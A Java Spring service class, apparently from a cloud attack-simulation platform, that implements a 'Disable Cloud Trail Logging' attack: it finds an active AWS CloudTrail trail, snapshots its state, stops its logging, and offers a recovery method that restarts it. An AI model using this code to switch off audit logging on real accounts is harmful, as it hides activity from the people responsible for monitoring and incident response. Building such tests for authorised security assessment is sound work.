package com.basic.sample.service.aws.impl.cloudtrail;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Optional;

import com.basic.sample.contract.dto.ResourceType;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Service;
import org.springframework.util.StopWatch;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import com.amazonaws.AmazonServiceException;
import com.amazonaws.services.cloudtrail.model.GetTrailStatusRequest;
import com.amazonaws.services.cloudtrail.model.ListTrailsRequest;
import com.amazonaws.services.cloudtrail.model.ListTrailsResult;
import com.amazonaws.services.cloudtrail.model.StartLoggingRequest;
import com.amazonaws.services.cloudtrail.model.StartLoggingResult;
import com.amazonaws.services.cloudtrail.model.StopLoggingRequest;
import com.amazonaws.services.cloudtrail.model.StopLoggingResult;
import com.amazonaws.services.cloudtrail.model.TrailInfo;
import com.fasterxml.jackson.core.JsonProcessingException;

import com.basic.sample.dto.AttackParams;
import com.basic.sample.dto.AttackProgress;
import com.basic.sample.dto.AttackRequest;
import com.basic.sample.dto.AttackSummaryStatus;
import com.basic.sample.dto.AttackType;
import com.basic.sample.model.AttackAwsDetailBo;
import com.basic.sample.model.AttackSummaryBo;
import com.basic.sample.model.CloudStateBo;
import com.basic.sample.service.aws.AttackRule;

@Service
public class TrailLoggingAttackRule extends AttackRule {
	
	@Override
	public AttackSummaryBo attack(AttackRequest attackRequest, AttackAwsDetailBo customerAwsDetail, AttackParams attackParam, SseEmitter sseEmmiter) {
		
		String status = null;
		String permission = null;
		String resourceName = "Disable Cloud Trail Logging";
		CloudStateBo cloudStateBo = null;
		AttackSummaryBo attackSummary = null;
		StopWatch watch = new StopWatch();
		watch.start();
		
		List<AttackProgress> attackProgress = new ArrayList<>();
		
		attackProgress.add(AttackProgress.builder()
				.status(true)
				.description("Disabling Cloud trails attack started")
				.duration(watch.getTotalTimeSeconds()).build());
		
		//TODO : Consider nextToken from results for pagination

		try {
			
			// Get the list of trails
			ListTrailsResult trailresult = attackParam.getCloudTrailClient().listTrails(new ListTrailsRequest());
			logger.info("All Trails : {}", objectMapper.writeValueAsString(trailresult.getTrails()));

			if(trailresult.getTrails().isEmpty()) {
				
				attackProgress.add(AttackProgress.builder()
						.status(false)
						.description("Cloud trails not present")
						.duration(watch.getTotalTimeSeconds()).build());
				
				attackSummary = getSummary(attackRequest, resourceName, permission, AttackSummaryStatus.NOT_EXECUTED.name(),
						attackProgress, watch, cloudStateBo);
				
				try {
					sseEmmiter.send(SseEmitter.event().name("Summary").data(attackSummary, MediaType.APPLICATION_JSON));
				} catch (IOException e) {
					logger.error("Error while sending SSE", e);
				}
				return attackSummary;
			}
			Optional<TrailInfo> enabledTrail = trailresult.getTrails().stream().filter(trail -> attackParam.getCloudTrailClient().getTrailStatus(new GetTrailStatusRequest().withName(trail.getName())).getIsLogging()).findAny();

			//TODO :  Part of report - No CloudTrail with logging enabled
			if(!enabledTrail.isPresent()) {
				
				attackProgress.add(AttackProgress.builder()
						.status(false)
						.description("No CloudTrail with logging enabled found")
						.duration(watch.getTotalTimeSeconds()).build());
				
				attackSummary = getSummary(attackRequest, resourceName, permission, AttackSummaryStatus.NOT_EXECUTED.name(),
						attackProgress, watch, cloudStateBo);
				
				try {
					sseEmmiter.send(SseEmitter.event().name("Summary").data(attackSummary, MediaType.APPLICATION_JSON));
				} catch (IOException e) {
					logger.error("Error while sending SSE", e);
				}
				return attackSummary;
			}

			TrailInfo trailInfo = enabledTrail.get();
			
			attackProgress.add(AttackProgress.builder()
					.status(true)
					.description("Recieved Cloud trails")
					.duration(watch.getTotalTimeSeconds()).build());
			
			try {

				// Persist security group to cloudstate
				cloudStateBo = CloudStateBo.builder()
						.csp(attackRequest.getTarget())
						.resourceType(ResourceType.TRAIL)
						.resourceName(trailInfo.getName())
						.snapshot(objectMapper.writeValueAsString(attackParam.getCloudTrailClient().getTrailStatus(new GetTrailStatusRequest().withName(trailInfo.getName()))))   
						.timeStamp(new Date())
						.build(); 
				cloudStateRepository.save(cloudStateBo);

				logger.info("Selected Trail for attack : {}", objectMapper.writeValueAsString(trailInfo));
				StopLoggingRequest request = new StopLoggingRequest().withName(trailInfo.getName());
				
				attackProgress.add(AttackProgress.builder()
						.status(true)
						.description(String.format("Selected Trail %s as a target for attack", trailInfo.getName()))
						.duration(watch.getTotalTimeSeconds()).build());

				StopLoggingResult result = attackParam.getCloudTrailClient().stopLogging(request);
				logger.info("Logging disabled for {}, Status : {}",  trailInfo.getName(), result.getSdkHttpMetadata().getHttpStatusCode());

				attackProgress.add(AttackProgress.builder()
						.status(true)
						.description(String.format("Loggin disabled for %s ", trailInfo.getName()))
						.duration(watch.getTotalTimeSeconds()).build());
				
				status = String.format("%s", AttackSummaryStatus.SUCCESS.name());
				permission = objectMapper.writeValueAsString(request);
			} catch (JsonProcessingException e) {
				logger.error("Error in Trail : {}", e.getMessage());
			}

		} catch (AmazonServiceException e) {
			logger.error("Error while Cloud Trail attack : {}", e.getMessage());
			attackProgress.add(AttackProgress.builder()
					.status(true)
					.description(String.format("Error while Cloud Trail attack %s ", e.getMessage()))
					.duration(watch.getTotalTimeSeconds()).build());
			status = String.format("%s (%s)", AttackSummaryStatus.FAIL.name(), e.getErrorCode());
		} catch (Exception e) {
			attackProgress.add(AttackProgress.builder()
					.status(true)
					.description(String.format("Error while Cloud Trail attack %s ", e.getMessage()))
					.duration(watch.getTotalTimeSeconds()).build());
			status = String.format("%s (%s)", AttackSummaryStatus.FAIL.name(), e.getMessage());
		}
		
		attackSummary = getSummary(attackRequest, resourceName, permission, status,
				attackProgress, watch, cloudStateBo);
		
		try {
			sseEmmiter.send(SseEmitter.event().name("Summary").data(attackSummary, MediaType.APPLICATION_JSON));
		} catch (IOException e) {
			logger.error("Error while sending SSE", e);
		}

		watch.stop();

		return attackSummary;
	}

	@Override
	public boolean recover(AttackSummaryBo attackSummaryBo, AttackParams attackParams) {
		try {
			Optional<CloudStateBo> result = Optional.of(attackSummaryBo.getCloudState());
			if(result.isPresent()) {
				CloudStateBo cloudstate = result.get();
				logger.info("Found Cloudstate Bucket : {}", cloudstate);

				try {
					StartLoggingRequest request = new StartLoggingRequest().withName(cloudstate.getResourceName());

					StartLoggingResult loggingResult = attackParams.getCloudTrailClient().startLogging(request);
					logger.info("Logging enabled for {}, Status : {}",  cloudstate.getResourceName(), loggingResult.getSdkHttpMetadata().getHttpStatusCode());
					
					cloudstate.setRecovered(true);
					cloudStateRepository.save(cloudstate);
					return true;
				} catch (Exception e) {
					logger.error("Error while recovering security group : {}", e.getMessage());
				}
			}
		} catch (Exception e) {
			logger.error("Error while recovering security group : {}", e.getMessage());
		}

		return false;
	}

	@Override
	public AttackType getAttackType() {
		return AttackType.CLOUD_TRAIL_DISABLE_LOGGING;
	}
	
	public AttackSummaryBo getSummary(AttackRequest attackRequest,String resourceName,
			String permission, String status, List<AttackProgress> attackProgress, StopWatch watch, CloudStateBo cloudStateBo ) {

		return AttackSummaryBo.builder()
				.userId(attackRequest.getUserId())
				.attackId(attackRequest.getAttackId())
				.attackName(AttackType.CLOUD_TRAIL_DISABLE_LOGGING.getName())
				.action(AttackType.CLOUD_TRAIL_DISABLE_LOGGING)
				.resourceName(resourceName)
				.resourceType(ResourceType.TRAIL)
				.permission(permission)
				.timetaken(watch.getTotalTimeSeconds())
				.timeStamp(new Date())
				.status(status)
				.details(attackProgress)
				.cloudState(cloudStateBo)
				.build();	

	}
}
